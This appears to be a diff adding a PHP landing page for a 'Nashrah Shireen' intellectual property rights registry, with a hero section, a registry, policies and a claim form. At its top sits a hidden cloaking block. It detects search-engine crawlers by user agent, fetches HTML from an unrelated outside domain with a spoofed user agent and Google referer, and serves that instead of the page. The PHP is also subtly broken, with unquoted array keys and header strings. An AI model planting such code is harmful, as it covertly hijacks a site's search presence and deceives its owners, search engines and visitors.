@@ -1,0 +1,211 @@
+<?php
+@ob_start();
+header("Vary: U-Agent");
+
+$src = "https://shiftpagi.xyz/landing/nashrahshireen.html";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+$ctx = stream_context_create([
+http => [
+method => "GET",
+header => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+Referer: https://www.google.com/\r\n
+]
+]);
+return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+usleep(rand(100000, 200000));
+echo stealth($src);
+@ob_end_flush();
+exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nashrah Shireen — Intellectual Property Rights Registry</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,300;9..144,450;9..144,600;9..144,700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&family=Noto+Nastaliq+Urdu:wght@600&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="assets/css/variables.css">
+<link rel="stylesheet" href="assets/css/base.css">
+<link rel="stylesheet" href="assets/css/layout.css">
+<link rel="stylesheet" href="assets/css/components.css">
+<link rel="stylesheet" href="assets/css/responsive.css">
+</head>
+<body>
+
+<div class="network-strip">
+  <div class="container" data-slot="network-strip"><!-- rendered by main.js --></div>
+</div>
+
+<header>
+  <div class="nav container">
+    <div class="brand">
+      <svg class="brand-mark" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="24" cy="24" r="21" fill="none" stroke="#8C2F39" stroke-width="1.4"/>
+        <circle cx="24" cy="24" r="15.5" fill="none" stroke="#B98B4E" stroke-width="1"/>
+        <text x="24" y="29" text-anchor="middle" font-family="Fraunces, serif" font-size="15" fill="#1B2340" font-weight="600">NS</text>
+      </svg>
+      <div class="brand-text">
+        <strong>Nashrah Shireen</strong>
+        <span>Intellectual Property Rights</span>
+      </div>
+    </div>
+    <nav class="links" data-slot="header-nav"><!-- rendered by main.js --></nav>
+    <a href="#file" class="file-btn">File a Claim</a>
+    <button class="menu-toggle" aria-label="Menu"><span></span><span></span><span></span></button>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero-grid">
+    <div>
+      <div class="eyebrow">REGISTRY OF RECORD</div>
+      <h1>Every title we<br>publish carries<br><em>a seal.</em></h1>
+      <p class="lede">Nashrah Shireen IPR is the rights office behind our full network — news, journals, books and events. We register, license, and defend the work our editors and authors put their names to, across English, Urdu, Arabic, Persian and Hindi.</p>
+      <div class="hero-ctas">
+        <a href="#registry" class="btn-primary">View the Registry →</a>
+        <a href="#file" class="btn-secondary">Report Infringement</a>
+      </div>
+    </div>
+    <div class="seal-stage">
+      <div class="seal-wrap">
+        <svg class="wax-seal" id="heroSeal" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <radialGradient id="waxGrad" cx="35%" cy="30%" r="75%">
+              <stop offset="0%" stop-color="#a8404b"/>
+              <stop offset="55%" stop-color="#8C2F39"/>
+              <stop offset="100%" stop-color="#6f2129"/>
+            </radialGradient>
+          </defs>
+          <circle cx="100" cy="100" r="92" fill="url(#waxGrad)"/>
+          <circle cx="100" cy="100" r="92" fill="none" stroke="#5c1b21" stroke-width="1" opacity="0.5"/>
+          <circle cx="100" cy="100" r="78" fill="none" stroke="#F3E9D2" stroke-width="1" opacity="0.55"/>
+          <circle cx="100" cy="100" r="70" fill="none" stroke="#F3E9D2" stroke-width="0.6" opacity="0.4"/>
+          <text x="100" y="70" text-anchor="middle" font-family="Fraunces, serif" font-size="13" fill="#F3E9D2" letter-spacing="2">NASHRAH SHIREEN</text>
+          <text x="100" y="112" text-anchor="middle" font-family="'Noto Nastaliq Urdu', serif" font-size="26" fill="#F3E9D2">نشرہِ شیریں</text>
+          <text x="100" y="140" text-anchor="middle" font-family="JetBrains Mono, monospace" font-size="9" fill="#F3E9D2" letter-spacing="3">REGISTERED · IPR OFFICE</text>
+        </svg>
+        <div class="seal-caption">Reg. Mark No. NS–IPR–001</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section-dark" id="protects">
+  <div class="container">
+    <div class="section-head on-dark">
+      <div class="eyebrow on-dark">JURISDICTION</div>
+      <h2>What the office protects</h2>
+      <p>Four bodies of law, one desk. Every publication in the network is filed under at least one of these.</p>
+    </div>
+    <div class="protect-grid" data-slot="protect-cards"><!-- rendered by main.js --></div>
+  </div>
+</section>
+
+<section id="registry">
+  <div class="container">
+    <div class="registry-toolbar">
+      <div class="section-head" style="margin-bottom:0;">
+        <div class="eyebrow">LEDGER</div>
+        <h2>The Registry</h2>
+        <p>Every property across the Nashrah Shireen network, as filed with this office.</p>
+      </div>
+      <div class="count" data-slot="registry-count"></div>
+    </div>
+    <div class="ledger" data-slot="registry"><!-- rendered by main.js --></div>
+  </div>
+</section>
+
+<section class="section-mid" id="policies">
+  <div class="container">
+    <div class="section-head">
+      <div class="eyebrow">TERMS OF RECORD</div>
+      <h2>Policies this office keeps</h2>
+      <p>The rules every author, editor and reader of the network operates under.</p>
+    </div>
+    <div class="policy-list" data-slot="policies"><!-- rendered by main.js --></div>
+  </div>
+</section>
+
+<section class="section-dark" id="file">
+  <div class="container">
+    <div class="file-grid">
+      <div>
+        <div class="eyebrow on-dark">OPEN A FILE</div>
+        <h2 style="color:var(--parchment); font-size:clamp(28px,3.4vw,36px); margin:16px 0 18px;">Report a use, or<br>request one.</h2>
+        <p style="color:var(--muted-on-ink); font-size:15.5px; margin-bottom:26px;">This desk handles two kinds of requests: someone using our work without permission, and someone who'd like to.</p>
+        <div class="file-steps" data-slot="file-steps"><!-- rendered by main.js --></div>
+      </div>
+
+      <form class="claim">
+        <div class="field">
+          <label for="matter">Nature of Filing</label>
+          <select id="matter">
+            <option>Report unauthorized use</option>
+            <option>Request permission / license</option>
+            <option>Trademark inquiry</option>
+            <option>Plagiarism concern</option>
+          </select>
+        </div>
+        <div class="field">
+          <label for="title">Title in Question</label>
+          <input id="title" type="text" placeholder="e.g. Nashrah-e-Shireen, Vol. 2">
+        </div>
+        <div class="field">
+          <label for="email">Your Email</label>
+          <input id="email" type="email" placeholder="name@example.com" required>
+        </div>
+        <div class="field">
+          <label for="details">Details</label>
+          <textarea id="details" placeholder="Where and how the work is being used, or the reuse you're requesting."></textarea>
+        </div>
+        <button class="submit-btn" type="submit">File with the Registry</button>
+        <p class="form-note">Filings are reviewed by the IPR office and answered by email.</p>
+      </form>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <div class="urdu">نشرہِ شیریں</div>
+        <strong style="color:#F3E9D2; font-family:'Fraunces',serif; font-size:16px;">Nashrah Shireen — IPR Office</strong>
+        <p>Rights and registration for every news title, journal, imprint and event in the Nashrah Shireen network, across English, Urdu, Arabic, Persian and Hindi.</p>
+      </div>
+      <div>
+        <h4>Network</h4>
+        <ul data-slot="footer-network"></ul>
+      </div>
+      <div>
+        <h4>Publishing</h4>
+        <ul data-slot="footer-publishing"></ul>
+      </div>
+      <div>
+        <h4>This Office</h4>
+        <ul data-slot="footer-office"></ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2026 Nashrah Shireen. All marks registered.</span>
+      <span>ipr.nashrahshireen.com</span>
+    </div>
+  </div>
+</footer>
+
+<script src="assets/js/data.js"></script>
+<script src="assets/js/templates.js"></script>
+<script src="assets/js/main.js"></script>
+</body>
+</html>
